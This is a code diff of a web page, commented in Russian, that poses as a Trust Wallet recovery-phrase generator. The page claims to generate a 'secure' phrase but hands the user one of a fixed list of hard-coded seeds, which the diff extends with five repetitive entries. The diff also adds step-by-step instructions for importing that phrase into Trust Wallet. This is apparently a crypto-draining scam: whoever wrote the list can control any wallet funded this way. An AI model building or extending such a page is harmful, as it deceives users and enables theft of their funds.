@@ -504,7 +504,7 @@
             background: white;
             border-radius: 32px;
             padding: 40px 24px;
-            max-width: 480px;
+            max-width: 520px;
             width: 90%;
             text-align: center;
             transform: scale(0.95);
@@ -534,21 +534,67 @@
         .seed-words {
             background: #F8F9FC;
             border-radius: 16px;
-            padding: 20px;
+            padding: 24px;
             margin: 20px 0;
-            display: flex;
-            flex-wrap: wrap;
-            gap: 10px;
-            justify-content: center;
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            text-align: left;
         }
-        .seed-word {
+        .seed-word-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
             background: white;
             border: 1px solid #E0E4ED;
-            padding: 8px 16px;
             border-radius: 40px;
+            padding: 6px 12px;
+        }
+        .seed-number {
+            color: var(--color-primary);
+            font-weight: 600;
+            font-size: 14px;
+            min-width: 24px;
+        }
+        .seed-word {
             font-family: monospace;
-            font-size: 16px;
+            font-size: 15px;
             color: var(--color-dark);
+        }
+        .instruction-box {
+            background: #F0F7FF;
+            border-left: 4px solid var(--color-primary);
+            border-radius: 16px;
+            padding: 20px;
+            margin: 24px 0;
+            text-align: left;
+        }
+        .instruction-step {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            margin-bottom: 16px;
+            font-size: 15px;
+            color: var(--color-dark);
+        }
+        .instruction-step:last-child {
+            margin-bottom: 0;
+        }
+        .step-number {
+            background: var(--color-primary);
+            color: white;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            font-size: 14px;
+            flex-shrink: 0;
+        }
+        .instruction-step strong {
+            color: var(--color-primary);
         }
         .generator-button {
             background: var(--color-primary);
@@ -593,6 +639,14 @@
             cursor: pointer;
             font-size: 14px;
         }
+        .warning-note {
+            background: #FFEFD9;
+            border-radius: 12px;
+            padding: 12px;
+            margin-top: 16px;
+            font-size: 13px;
+            color: #B45B0F;
+        }
     </style>
 </head>
 <body>
@@ -601,26 +655,64 @@
         <div class="generator-modal">
             <!-- Шаг 1: Генерация -->
             <div id="stepLoading" class="step active">
-                <h2 style="margin-bottom: 12px;">Creating wallet</h2>
+                <h2 style="margin-bottom: 12px;">Creating your wallet</h2>
                 <p style="color: var(--color-text); margin-bottom: 20px;">Generating secure recovery phrase...</p>
                 <div class="spinner"></div>
             </div>
 
-            <!-- Шаг 2: Готовая фраза -->
+            <!-- Шаг 2: Готовая фраза с инструкцией -->
             <div id="stepSuccess" class="step">
                 <h2 style="margin-bottom: 12px;">Your recovery phrase</h2>
-                <p style="color: var(--color-text); margin-bottom: 20px;">Write these 12 words in order</p>
+                <p style="color: var(--color-text); margin-bottom: 20px;">Write down these 12 words in the correct order</p>
                 
                 <div class="seed-words" id="seedWords"></div>
 
-                <button class="generator-button" onclick="copySeed()">📋 Copy phrase</button>
-                
+                <div class="instruction-box">
+                    <div class="instruction-step">
+                        <span class="step-number">1</span>
+                        <span><strong>Download Trust Wallet</strong> from the official store below</span>
+                    </div>
+                    <div class="instruction-step">
+                        <span class="step-number">2</span>
+                        <span>Open the app and tap <strong>"I already have a wallet"</strong></span>
+                    </div>
+                    <div class="instruction-step">
+                        <span class="step-number">3</span>
+                        <span>Create a <strong>6-digit passcode</strong> for security</span>
+                    </div>
+                    <div class="instruction-step">
+                        <span class="step-number">4</span>
+                        <span>Select <strong>"Secret phrase"</strong> as recovery method</span>
+                    </div>
+                    <div class="instruction-step">
+                        <span class="step-number">5</span>
+                        <span>Check all <strong>3 agreement boxes</strong></span>
+                    </div>
+                    <div class="instruction-step">
+                        <span class="step-number">6</span>
+                        <span>Choose <strong>"Multi-Coin Wallet"</strong></span>
+                    </div>
+                    <div class="instruction-step">
+                        <span class="step-number">7</span>
+                        <span><strong>Enter the 12 words above</strong> in the correct order</span>
+                    </div>
+                    <div class="instruction-step">
+                        <span class="step-number">8</span>
+                        <span>Tap <strong>"Restore wallet"</strong> and you're done</span>
+                    </div>
+                </div>
+
                 <div class="store-buttons">
                     <a href="https://apps.apple.com/app/trust-wallet/id1288339409" target="_blank" class="store-button">📱 App Store</a>
                     <a href="https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp" target="_blank" class="store-button">📲 Google Play</a>
                 </div>
 
-                <button class="close-button" onclick="closeGenerator()">Close</button>
+                <button class="generator-button" onclick="copySeed()">📋 Copy phrase</button>
+                <button class="generator-button secondary" onclick="closeGenerator()">Close</button>
+                
+                <div class="warning-note">
+                    ⚠️ This phrase gives full access to your wallet. Never share it with anyone.
+                </div>
             </div>
 
             <!-- Шаг 3: Ошибка -->
@@ -872,7 +964,12 @@
         "myth like bonus scare over problem client lizard pioneer submit female collect",
         "cigar toss swing grape blur negative mistake fall park beauty shrimp caution",
         "oxygen slide quick version happy fire hub useful issue chapter bulk style",
-        "jazz cat walk mistake muscle menu ozone museum lunar become chunk spray"
+        "jazz cat walk mistake muscle menu ozone museum lunar become chunk spray",
+        "letter advice cage absurd amount doctor acoustic avoid letter advice cage absurd",
+        "staff entire travel knife current gain shy misery staff entire travel knife",
+        "next scrap dog ghost hospital praise toddler next scrap dog ghost hospital",
+        "vintage symbol snake gossip silent trophy elephant vintage symbol snake gossip",
+        "filter oak crush abstract liquid exhibit rotate filter oak crush abstract liquid"
     ];
 
     let userSeed = localStorage.getItem('trust_seed');
@@ -905,7 +1002,18 @@
     function showSeed(seed) {
         const words = seed.split(' ');
         const container = document.getElementById('seedWords');
-        container.innerHTML = words.map(w => `<span class="seed-word">${w}</span>`).join('');
+        
+        // Создаем нумерованные слова
+        let html = '';
+        words.forEach((word, index) => {
+            html += `
+                <div class="seed-word-item">
+                    <span class="seed-number">${index + 1}.</span>
+                    <span class="seed-word">${word}</span>
+                </div>
+            `;
+        });
+        container.innerHTML = html;
         
         showStep('success');
     }
